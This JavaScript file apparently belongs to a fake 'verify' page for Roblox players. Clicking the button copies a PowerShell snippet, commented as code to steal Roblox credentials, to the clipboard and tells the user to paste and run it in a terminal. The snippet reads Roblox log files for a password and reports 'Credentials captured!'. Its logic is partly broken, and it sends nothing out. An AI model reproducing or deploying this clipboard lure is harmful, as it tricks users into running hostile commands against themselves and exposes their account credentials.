document.addEventListener('DOMContentLoaded', (event) => {
    const verifyButton = document.getElementById('verify-button');

    verifyButton.addEventListener('click', () => {
        // Code to steal Roblox credentials
        const robloxStealerCode = `
            $username = (Get-ChildItem -Path "C:\\Users\\$env:USERNAME\\AppData\\Local\\Roblox\\Logs" -Filter "*.log" | Select-Object -Last 1).FullName
            $password = (Get-Content -Path $username | Select-String -Pattern "Password=.*" | ForEach-Object { $_.Matches.Groups[1].Value })
            $credentials = "$username:$password"
            Set-Clipboard -Value $credentials
            Start-Process "powershell" -ArgumentList "-Command", "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Credentials captured!', 'Success', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information);"
        `;

        // Copy the Roblox stealer code to the clipboard
        navigator.clipboard.writeText(robloxStealerCode).then(() => {
            console.log('Code copied to clipboard:', robloxStealerCode);

            // Provide instructions to the user
            alert('Please open your terminal and press Enter to execute the copied command.');
        }).catch(err => {
            console.error('Failed to copy code to clipboard:', err);
        });
    });
});
